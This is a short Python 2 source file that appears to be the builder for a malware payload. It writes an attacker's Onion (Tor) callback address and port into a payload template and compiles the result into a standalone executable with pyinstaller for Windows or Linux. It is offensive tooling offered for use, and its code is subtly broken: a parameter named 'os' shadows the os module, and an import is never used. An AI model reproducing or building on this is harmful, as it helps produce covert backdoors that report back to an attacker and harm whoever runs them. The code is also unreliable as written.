import os
import miniupnpc

class Generator:
    def __init__(self,payload,port,addr,outfile="payload.py",opts={}):
        print "[+] generating payload"
        self.payload = payload
        self.port = port
        self.addr = addr
        self.outfile = outfile
        self.opts = opts

    def createPayload(self):
        counter = 0
        f = open(self.outfile,'w')
        for lines in open(self.payload,'r'):
            if lines.startswith("#constents"):
                counter = 2
                continue
            elif counter == 2:
                f.write('OnionUrl = "' + self.addr + '"\n')
                counter = 1
                continue
            elif counter == 1:
                f.write("PORT = " + str(self.port))
                counter = 0
                continue
            f.write(lines)
        f.close()
        print "[+] payload generated"

    def Compile(self):
        c = compiler(self.outfile,'~/',self.payload.split("/")[0])
        
    def handler(self):
        self.createPayload()
        if self.opts["compile"] == True:
            self.Compile()
        
    

class compiler:

    def __init__(self,infile,dir,os):
        if os == "windows":
            os.system("wine ~/.wine/drive_c/Python27/Scripts/pyinstaller -F --specpath " + dir + " " + infile)
        if os == "linux":
            os.system("pyinstaller -F --specpath " + dir + " " + infile)


